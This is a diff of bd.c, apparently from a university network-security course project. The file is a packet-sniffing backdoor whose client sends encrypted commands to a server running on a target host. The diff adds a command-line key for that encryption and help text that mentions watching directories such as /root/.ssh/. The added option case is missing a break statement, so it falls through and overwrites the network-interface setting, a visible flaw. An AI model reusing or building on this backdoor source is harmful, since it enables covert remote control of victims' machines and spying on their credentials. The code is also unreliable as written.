@@ -1,9 +1,9 @@
 /*
 | ------------------------------------------------------------------------------
 | File:     bd.c
-| Purpose:  COMP 8505 Assignment 2
+| Purpose:  COMP 8505 Final Project
 | Authors:  Kevin Eng, Jeremy Tsang
-| Date:     Oct 6, 2014
+| Date:     Dec 8, 2014
 |
 | Notes:    A packet-sniffing backdoor in C. This program includes the client
 |           and server together as one main executable.
@@ -40,18 +40,20 @@ int main(int argc, char **argv){
 
     int is_server = 0;
     struct client_opt c_opt;
+    c_opt.key[0] = '\0';
     c_opt.target_host[0] = '\0';
     c_opt.command[0] = '\0';
     c_opt.target_port = 0;
     c_opt.device[0] = '\0';
     c_opt.protocol = 0;
     struct server_opt s_opt;
+    s_opt.key[0] = '\0';
     s_opt.device[0] = '\0';
     s_opt.protocol = 0;
     s_opt.packet_delay = 200000; // Default 1/50 of a second
 
     int opt;
-    while((opt = getopt(argc, argv, "hsi:d:p:ut:x:")) != -1){
+    while((opt = getopt(argc, argv, "hsk:i:d:p:ut:x:")) != -1){
         switch(opt){
             case 'h':
                 usage();
@@ -60,6 +62,9 @@ int main(int argc, char **argv){
             case 's':
                 is_server = 1;
                 break;
+            case 'k':
+                strcpy(c_opt.key, optarg);
+                strcpy(s_opt.key, optarg);
             case 'i':
                 strcpy(c_opt.device, optarg);
                 strcpy(s_opt.device, optarg);
@@ -139,7 +144,7 @@ void client(struct client_opt c_opt){
 
     char *bd_message;
     int bd_message_len;
-    bd_message = bd_encrypt(c_opt.command, &bd_message_len);
+    bd_message = bd_encrypt(c_opt.command, &bd_message_len, c_opt.key);
     if(bd_message == NULL){
         return;
     }
@@ -643,7 +648,7 @@ void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const
 
     //printf("payload_len: %d\n",payload_len);
     char *bd_command;
-    bd_command = bd_decrypt((char *)packet_info.payload, payload_len);
+    bd_command = bd_decrypt((char *)packet_info.payload, payload_len, s_opt_ptr->key);
     if(bd_command == NULL){
         return;
     }
@@ -911,6 +916,7 @@ void usage(){
     printf("---------------------------\n");
     printf("  -h                    Display this help.\n");
     printf("CLIENT (default)\n");
+    printf("  -k <key>              The key to encrypt transmission with.\n");
     printf("  -d <target_host>      The target host where the backdoor server is running.\n");
     printf("  -p <target_port>      The target port to send to.\n");
     printf("  -i <interface_name>   Network interface to use.\n");
@@ -919,6 +925,7 @@ void usage(){
     printf("                        for activity, type 'WATCH:' followed by the directory path\n");
     printf("                        e.g. 'WATCH:/root/.ssh/'.\n");
     printf("SERVER\n");
+    printf("  -k <key>              The key to encrypt transmission with.\n");
     printf("  -s                    Enables server mode.\n");
     printf("  -i <interface_name>   Network interface to use.\n");
     printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
